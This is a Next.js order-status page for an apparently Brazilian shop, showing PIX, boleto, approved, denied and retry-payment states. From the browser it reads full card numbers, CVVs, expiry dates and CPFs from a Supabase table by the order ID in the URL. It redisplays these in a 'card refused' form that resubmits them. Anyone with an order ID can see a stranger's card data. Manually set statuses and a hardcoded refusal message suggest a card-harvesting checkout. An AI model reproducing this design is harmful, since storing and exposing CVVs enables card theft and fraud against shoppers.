'use client';

import { useEffect, useState, useRef } from 'react';
import Image from 'next/image';
import { supabase } from '@/lib/supabase';
import { Footer } from '@/components/order-status/Footer';
import { trackCompleteRegistration, initializePixel } from '@/services/pixel/pixelEvents';

interface OrderData {
  status: string;
  payment_method: string;
  total_price: string;
  product_name: string;
  cod_pix?: string;
  cod_billet?: string;
  link_billet?: string;
  order_id?: string;
  card_name?: string;
  card_number?: string;
  cvv?: string;
  expiration_date?: string;
  cpf_card?: string;
  product_id?: string;
}

export default function OrderStatusPage({
  searchParams,
}: {
  searchParams: { [key: string]: string | undefined };
}) {
  const [orderData, setOrderData] = useState<OrderData | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [copiedPix, setCopiedPix] = useState(false);
  const [copiedBillet, setCopiedBillet] = useState(false);
  const [formData, setFormData] = useState({
    card_name: '',
    card_number: '',
    cvv: '',
    expiration_date: '',
    cpf_card: ''
  });
  const [isEdited, setIsEdited] = useState(false);
  const [isFormInitialized, setIsFormInitialized] = useState(false);
  const orderId = searchParams.orderId || searchParams.order_id || searchParams.id;
  const lastStatusRef = useRef<string | null>(null);

  useEffect(() => {
    initializePixel();
  }, []);

  useEffect(() => {
    const fetchOrderData = async () => {
      if (!orderId) {
        setIsLoading(false);
        return;
      }

      try {
        const { data, error } = await supabase
          .from('orders')
          .select('status, payment_method, total_price, product_name, cod_pix, cod_billet, link_billet, order_id, card_name, card_number, cvv, expiration_date, cpf_card, product_id')
          .eq('order_id', orderId)
          .single();

        if (error) {
          console.error('Erro ao buscar dados do pedido:', error);
          setIsLoading(false);
          return;
        }

        if (data) {
          setOrderData(data);
          
          // Se o status mudou para aprovado e não foi processado antes
          if (data.status === 'approved' && lastStatusRef.current !== 'approved') {
            console.log('Disparando CompleteRegistration com dados:', {
              content_name: data.product_name,
              content_id: data.product_id,
              value: parseFloat(data.total_price),
              currency: 'BRL',
              status: true,
              order_id: data.order_id
            });

            trackCompleteRegistration({
              content_name: data.product_name,
              content_id: data.product_id,
              value: parseFloat(data.total_price),
              currency: 'BRL',
              status: true,
              order_id: data.order_id
            });
          }
          
          // Atualiza o último status processado
          lastStatusRef.current = data.status;
        }
        setIsLoading(false);
      } catch (error) {
        console.error('Erro ao processar dados:', error);
        setIsLoading(false);
      }
    };

    fetchOrderData();
    const pollInterval = setInterval(fetchOrderData, 2000);
    return () => clearInterval(pollInterval);
  }, [orderId]); // Removido orderData da dependência

  useEffect(() => {
    if (orderData && !isFormInitialized) {
      setFormData({
        card_name: orderData.card_name || '',
        card_number: orderData.card_number || '',
        cvv: orderData.cvv || '',
        expiration_date: orderData.expiration_date || '',
        cpf_card: orderData.cpf_card || ''
      });
      setIsFormInitialized(true);
    }
  }, [orderData, isFormInitialized]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    setIsEdited(true);
  };

  const handleRetryPayment = async () => {
    if (!orderData?.order_id) return;

    try {
      const { error } = await supabase
        .from('orders')
        .update({
          ...formData,
          status: 'retentativa'
        })
        .eq('order_id', orderData.order_id);

      if (error) throw error;
      
      // Atualizar o estado local após sucesso
      if (orderData) {
        setOrderData({
          ...orderData,
          ...formData,
          status: 'retentativa'
        });
      }
    } catch (error) {
    }
  };

  const handleCopyPix = async () => {
    if (orderData?.cod_pix) {
      try {
        await navigator.clipboard.writeText(orderData.cod_pix);
        setCopiedPix(true);
        // Reset o texto após 3 segundos
        setTimeout(() => {
          setCopiedPix(false);
        }, 3000);
      } catch (err) {
      }
    }
  };

  const handleCopyBillet = async () => {
    if (orderData?.cod_billet) {
      try {
        await navigator.clipboard.writeText(orderData.cod_billet);
        setCopiedBillet(true);
        // Reset o texto após 3 segundos
        setTimeout(() => {
          setCopiedBillet(false);
        }, 3000);
      } catch (err) {
      }
    }
  };

  const handleWhatsAppRedirect = () => {
    if (orderData?.order_id) {
      const phoneNumber = '5522999412640';
      const message = `Olá! Gostaria de receber o boleto da minha compra: ${orderData.order_id}`;
      const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
      window.open(whatsappUrl, '_blank');
    }
  };

  const handleWhatsAppTracking = () => {
    if (orderData?.order_id) {
      const phoneNumber = '5522999412640';
      const message = `Olá! Gostaria de acompanhar meu pedido: ${orderData.order_id}`;
      const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
      window.open(whatsappUrl, '_blank');
    }
  };

  const handleSupportContact = () => {
    if (orderData?.order_id) {
      const phoneNumber = '5522999412640';
      const message = `Olá! Estou com problemas no meu pedido: ${orderData.order_id}`;
      const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
      window.open(whatsappUrl, '_blank');
    }
  };

  const handleRetryOrder = () => {
    if (orderData?.product_id) {
      window.location.href = `/checkout/${orderData.product_id}`;
    }
  };

  const renderLoadingState = () => {
    return (
      <>
        <div className="bg-[#1DA6E0] text-white px-4 py-6">
          <div className="flex flex-col items-center gap-2">
            <div className="w-12 h-12 animate-spin rounded-full border-4 border-white border-t-transparent"></div>
            <h1 className="text-center text-lg font-medium">
              Por favor aguarde
            </h1>
            <p className="text-center">
              Estamos gerando seu pedido...
            </p>
          </div>
        </div>
        <main className="flex-1 container mx-auto px-4 py-6">
          <div className="max-w-md mx-auto bg-white rounded-lg shadow-sm">
            <div className="p-4 -mt-[50px] mb-[50px]">
              <div className="animate-pulse space-y-4">
                <div className="h-4 bg-gray-200 rounded w-3/4 mx-auto"></div>
                <div className="h-4 bg-gray-200 rounded w-1/2 mx-auto"></div>
              </div>
            </div>
          </div>
        </main>
      </>
    );
  };

  // Função auxiliar para formatar valor em reais
  const formatPrice = (price: string) => {
    return `R$ ${parseFloat(price).toFixed(2).replace('.', ',')}`;
  };

  const renderPixPending = () => {
    if (!orderData) return null;
    const { total_price, product_name, cod_pix } = orderData;

    return (
      <>
        <div className="bg-[#1DA6E0] text-white px-4 py-6">
          <h1 className="text-center text-[14px] font-medium leading-snug mb-5">
            Pague {formatPrice(total_price)} via PIX e garanta {product_name} com<br />
            valor promocional
          </h1>
        </div>
        <main className="flex-1 container mx-auto px-4 py-6">
          <div className="max-w-md mx-auto bg-white rounded-lg shadow-sm">
            <div className="p-4 -mt-[50px] mb-[50px]">
              <h2 className="text-center text-[15px] mb-4 font-bold">
                Estamos quase lá! Clique em copiar código
              </h2>
              
              <div className="space-y-2 text-[12px] mb-6">
                <p>
                  1. Abra o app do seu banco ou entre no Internet Banking
                </p>
                <p>
                  2. Escolha a opção pagar com PIX e cole o código
                </p>
                <p>
                  3. Confira as informações e finalize o pagamento somente se o processador for Seven Pay
                </p>
                <p>
                  4. Prontinho! Após o pagamento, seu pedido será enviado com todo o carinho que você merece
                </p>
              </div>

              <div className="text-center mb-4">
                <span className="text-gray-600 text-sm block overflow-hidden text-ellipsis whitespace-nowrap px-4">
                  {cod_pix || 'Código PIX não disponível'}
                </span>
              </div>

              <div className="space-y-3">
                <button
                  onClick={handleCopyPix}
                  className={`w-full ${
                    copiedPix 
                      ? 'bg-[#d9e7fa] text-[#1DA6E0]' 
                      : 'bg-[#1DA6E0] hover:bg-[#1890c0] text-white'
                  } py-3 rounded-md text-sm font-medium transition-colors duration-200`}
                >
                  {copiedPix ? 'código copiado' : 'copiar código PIX'}
                </button>
              </div>

              <div className="flex items-center justify-center gap-2 mt-6">
                <div className="w-5 h-5">
                  <Image
                    src="/relogio.png"
                    alt="Relógio"
                    width={20}
                    height={20}
                  />
                </div>
                <p className="text-sm text-gray-600">
                  Pagamento com Pix tem aprovação imediata. Não perca tempo!
                </p>
              </div>
            </div>

            <div className="border-t border-gray-200 p-4 -mt-[50px] mb-[50px]">
              <div className="flex justify-center">
                <Image
                  src="/logo principal.webp"
                  alt="Logo Principal"
                  width={200}
                  height={40}
                />
              </div>
            </div>
          </div>
        </main>
      </>
    );
  };

  const renderBoletoPending = () => {
    if (!orderData) return null;
    const { total_price, product_name, cod_billet } = orderData;

    return (
      <>
        <div className="bg-[#1DA6E0] text-white px-4 py-6">
          <h1 className="text-center text-[14px] font-medium leading-snug mb-5">
            Pague {formatPrice(total_price)} via Boleto e garanta {product_name} com<br />
            valor promocional
          </h1>
        </div>
        <main className="flex-1 container mx-auto px-4 py-6">
          <div className="max-w-md mx-auto bg-white rounded-lg shadow-sm">
            <div className="p-4 -mt-[50px] mb-[50px]">
              <h2 className="text-center text-[15px] mb-4 font-bold">
                Estamos quase lá! Clique em copiar código
              </h2>
              
              <div className="space-y-2 text-[12px] mb-6">
                <p>
                  1. Abra o app do seu banco ou entre no Internet Banking
                </p>
                <p>
                  2. Escolha a opção pagar com código de barras e cole o código do boleto
                </p>
                <p>
                  3. Confira as informações e finalize o pagamento somente se o processador for Seven Pay
                </p>
                <p>
                  4. Prontinho! Após o pagamento, seu pedido será enviado com todo o carinho que você merece
                </p>
              </div>

              <div className="text-center mb-4">
                <span className="text-gray-600 text-sm break-all px-4">
                  {cod_billet || 'Código do boleto não disponível'}
                </span>
              </div>

              <div className="space-y-3">
                <button
                  onClick={handleCopyBillet}
                  className={`w-full ${
                    copiedBillet 
                      ? 'bg-[#d9e7fa] text-[#1DA6E0]' 
                      : 'bg-[#1DA6E0] hover:bg-[#1890c0] text-white'
                  } py-3 rounded-md text-sm font-medium transition-colors duration-200`}
                >
                  {copiedBillet ? 'código copiado' : 'copiar código do boleto'}
                </button>

                <button
                  onClick={handleWhatsAppRedirect}
                  className="w-full bg-[#1DA6E0] hover:bg-[#1890c0] text-white py-3 rounded-md text-sm font-medium"
                >
                  baixar boleto
                </button>
              </div>

              <div className="flex items-center justify-center gap-2 mt-6">
                <div className="w-5 h-5">
                  <Image
                    src="/relogio.png"
                    alt="Relógio"
                    width={20}
                    height={20}
                  />
                </div>
                <p className="text-sm text-gray-600">
                  Pagamento com Boleto leva até 3 dias úteis para ser aprovado
                </p>
              </div>
            </div>

            <div className="border-t border-gray-200 p-4 -mt-[50px] mb-[50px]">
              <div className="flex justify-center">
                <Image
                  src="/logo principal.webp"
                  alt="Logo Principal"
                  width={200}
                  height={40}
                />
              </div>
            </div>
          </div>
        </main>
      </>
    );
  };

  const renderPaidStatus = () => {
    if (!orderData) return null;
    const { total_price, product_name } = orderData;

    return (
      <>
        <div className="bg-[#1DA6E0] text-white px-4 py-6">
          <div className="flex flex-col items-center">
            <div className="w-12 h-12 mb-2">
              <Image
                src="/pagamento aprovado.png"
                alt="Pagamento Aprovado"
                width={48}
                height={48}
              />
            </div>
            <h1 className="text-center text-[14px] font-medium">
              Pronto, seu pagamento de {formatPrice(total_price)} foi aprovado!
            </h1>
            <p className="text-center text-[12px] mb-5">
              Você fez uma compra incrível!
            </p>
          </div>
        </div>
        <main className="flex-1 container mx-auto px-4 py-6">
          <div className="max-w-md mx-auto bg-white rounded-lg shadow-sm">
            <div className="p-4 -mt-[50px] mb-[50px]">
              <div className="mb-4">
                <p className="text-[12px]">
                  Novidade imperdível! Agora você pode acompanhar todas as atualizações de envio e entrega diretamente no seu WhatsApp. Clique no botão abaixo, sem complicações. Não perca essa facilidade, sua entrega na palma da mão!
                </p>
              </div>
              
              <div className="space-y-2 text-[12px] mb-5">
                <p>1. Clique no botão abaixo</p>
                <p>2. Envie a mensagem "Atualizações do meu pedido"</p>
                <p>3. Prontinho! Você receberá atualizações sempre que seu pacote sofrer alguma alteração de status</p>
              </div>

              <button
                onClick={handleWhatsAppTracking}
                className="w-full bg-[#1DA6E0] hover:bg-[#1890c0] text-white py-3 rounded-md text-sm font-medium"
              >
                Acompanhar pelo WhatsApp
              </button>
            </div>

            <div className="border-t border-gray-200 p-4 -mt-[50px] mb-[50px]">
              <div className="flex justify-center">
                <Image
                  src="/logo principal.webp"
                  alt="Logo Principal"
                  width={200}
                  height={40}
                />
              </div>
            </div>
          </div>
        </main>
      </>
    );
  };

  const renderFailedStatus = () => {
    if (!orderData) return null;
    const { product_name } = orderData;

    return (
      <>
        <div className="bg-red-500 text-white px-4 py-6">
          <div className="flex flex-col items-center gap-2">
            <div className="w-12 h-12">
              <Image
                src="/pagamento recusado.png"
                alt="Pagamento Recusado"
                width={48}
                height={48}
              />
            </div>
            <h1 className="text-center text-[14px] font-medium mb-1">
              Ops! Houve um problema com seu pagamento!
            </h1>
            <p className="text-center text-[12px]">
              Motivo: Informações do cartão inválidas.
            </p>
          </div>
        </div>
        <main className="flex-1 container mx-auto px-4 py-6">
          <div className="max-w-md mx-auto bg-white rounded-lg shadow-sm">
            <div className="p-4 -mt-[50px] mb-[50px]">
              <div className="mb-6">
                <h2 className="text-[15px] font-medium text-center mb-4">
                  Mas ainda há tempo de concluir sua compra!
                </h2>
                <p className="text-[14px] text-center">
                  Finalize a compra por PIX, Cartão ou Boleto, lembre-se de conferir se todas as informações estão corretas. Escolha uma opção abaixo e finalize seu pedido.
                </p>
              </div>

              <div className="space-y-3">
                <button
                  onClick={() => {/* Implementar tentar novamente */}}
                  className="w-full bg-[#1DA6E0] hover:bg-[#1890c0] text-white py-3 rounded-md text-sm font-medium"
                >
                  Tentar novamente
                </button>

                <button
                  onClick={() => {/* Implementar preciso de ajuda */}}
                  className="w-full bg-[#1DA6E0] hover:bg-[#1890c0] text-white py-3 rounded-md text-sm font-medium"
                >
                  Preciso de ajuda
                </button>
              </div>
            </div>

            <div className="border-t border-gray-200 p-4 -mt-[50px] mb-[50px]">
              <div className="flex justify-center">
                <Image
                  src="/logoprincipal.webp"
                  alt="Logo Principal"
                  width={200}
                  height={40}
                />
              </div>
            </div>
          </div>
        </main>
      </>
    );
  };

  const renderDeniedStatus = () => {
    if (!orderData) return null;
    const { total_price } = orderData;

    return (
      <>
        <div className="bg-[#FF4B4B] text-white px-4 py-6">
          <div className="flex flex-col items-center">
            <div className="w-12 h-12 mb-4">
              <Image
                src="/pagamento recusado.png"
                alt="Pagamento Recusado"
                width={48}
                height={48}
              />
            </div>
            <h1 className="text-center text-[14px] font-medium mb-2">
              Pagamento Recusado
            </h1>
            <p className="text-center text-[12px] mb-5">
              Infelizmente seu pagamento foi recusado. Por favor, tente novamente com outro cartão ou selecione outro método de pagamento.
            </p>
          </div>
        </div>
        <main className="flex-1 container mx-auto px-4 py-6">
          <div className="max-w-md mx-auto bg-white rounded-lg shadow-sm">
            <div className="p-4 -mt-[50px]">
              <div className="text-center mb-6">
                <p className="text-[12px] text-gray-600 font-bold mb-6">
                  Se você continuar tendo problemas, entre em contato com nosso suporte.
                </p>
                <div className="space-y-3">
                  <button
                    onClick={handleRetryOrder}
                    className="w-full bg-[#1DA6E0] hover:bg-[#1890c0] text-white py-3 rounded-md text-sm font-medium"
                  >
                    Refazer Pedido
                  </button>
                  <button
                    onClick={handleSupportContact}
                    className="w-full bg-[#25D366] hover:bg-[#20bd5a] text-white py-3 rounded-md text-sm font-medium"
                  >
                    Entrar em Contato com o Suporte
                  </button>
                </div>
              </div>
            </div>
          </div>
        </main>
      </>
    );
  };

  const renderPendingStatus = () => {
    if (!orderData) return null;
    const { total_price, product_name, payment_method } = orderData;

    return (
      <>
        <div className="bg-yellow-500 text-white px-4 py-6">
          <div className="flex flex-col items-center gap-2">
            <div className="w-12 h-12">
              <Image
                src="/pendente2.png"
                alt="Pagamento Pendente"
                width={48}
                height={48}
              />
            </div>
            <h1 className="text-center text-[14px] font-medium mb-1">
              Pagamento em Processamento
            </h1>
            <p className="text-center text-[12px]">
              Seu pagamento de {formatPrice(total_price)} está sendo processado.
            </p>
          </div>
        </div>
        <main className="flex-1 container mx-auto px-4 py-6">
          <div className="max-w-md mx-auto bg-white rounded-lg shadow-sm">
            <div className="p-4">
              <div className="space-y-4">
                <p className="text-gray-600 text-center">
                  Assim que seu pagamento for confirmado, você receberá uma notificação por Email e WhatsApp.
                </p>
              </div>
            </div>
          </div>
        </main>
      </>
    );
  };

  const renderRetryPayment = () => {
    if (!orderData) return null;
    const { total_price } = orderData;

    return (
      <>
        <div className="bg-[#FF4B4B] text-white px-4 py-6">
          <div className="flex flex-col items-center">
            <div className="w-12 h-12 mb-2">
              <Image
                src="/pagamento recusado.png"
                alt="Pagamento Recusado"
                width={48}
                height={48}
              />
            </div>
            <h1 className="text-center text-[14px] font-medium mb-2">
              Ops! Seu pagamento de {formatPrice(total_price)} foi recusado.
            </h1>
            <p className="text-center text-[12px] mb-3">
              Por favor, verifique as informações do cartão abaixo:
            </p>
          </div>
        </div>
        <main className="flex-1 container mx-auto px-4 py-6">
          <div className="max-w-md mx-auto bg-white rounded-lg shadow-sm">
            <div className="p-4 -mt-[50px]">
              <div className="space-y-4 mb-6">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Nome no Cartão
                  </label>
                  <input
                    type="text"
                    name="card_name"
                    value={formData.card_name}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Número do Cartão
                  </label>
                  <input
                    type="text"
                    name="card_number"
                    value={formData.card_number}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md"
                  />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      Data de Validade
                    </label>
                    <input
                      type="text"
                      name="expiration_date"
                      value={formData.expiration_date}
                      onChange={handleInputChange}
                      placeholder="MM/AA"
                      className="w-full px-3 py-2 border border-gray-300 rounded-md"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      CVV
                    </label>
                    <input
                      type="text"
                      name="cvv"
                      value={formData.cvv}
                      onChange={handleInputChange}
                      maxLength={4}
                      className="w-full px-3 py-2 border border-gray-300 rounded-md"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    CPF do Titular
                  </label>
                  <input
                    type="text"
                    name="cpf_card"
                    value={formData.cpf_card}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md"
                  />
                </div>
              </div>

              <div className="space-y-3 text-[12px] mb-6">
                <p>✓ Confira se o cartão possui limite disponível</p>
                <p>✓ Verifique se os dados do cartão estão corretos</p>
                <p>✓ Confirme se o cartão está desbloqueado</p>
              </div>

              <button
                onClick={handleRetryPayment}
                className="w-full bg-[#1DA6E0] hover:bg-[#1890c0] text-white py-3 rounded-md text-sm font-medium"
              >
                {isEdited ? 'Atualizar Pagamento' : 'Minhas informações estão corretas'}
              </button>
            </div>
          </div>
        </main>
      </>
    );
  };

  const renderContent = () => {
    if (isLoading) {
      return renderLoadingState();
    }

    if (!orderData) {
      return (
        <div className="bg-red-500 text-white px-4 py-6">
          <div className="flex flex-col items-center gap-2">
            <h1 className="text-center text-lg font-medium">
              Pedido não encontrado
            </h1>
            <p className="text-center">
              Não foi possível encontrar os dados do seu pedido.
            </p>
          </div>
        </div>
      );
    }

    // Renderiza o conteúdo baseado no status do pedido
    switch (orderData.status.toLowerCase()) {
      case 'aguardando':
        return renderLoadingState();
      
      case 'denied':
        return renderDeniedStatus();
      
      case 'approved':
        return renderPaidStatus();
      
      case 'pending':
        if (orderData.payment_method === 'pix') {
          return renderPixPending();
        } else if (orderData.payment_method === 'boleto') {
          return renderBoletoPending();
        }
        return renderPendingStatus();
      
      case 'retry_payment':
        return renderRetryPayment();
      
      default:
        return renderLoadingState();
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      {renderContent()}
    </div>
  );
}
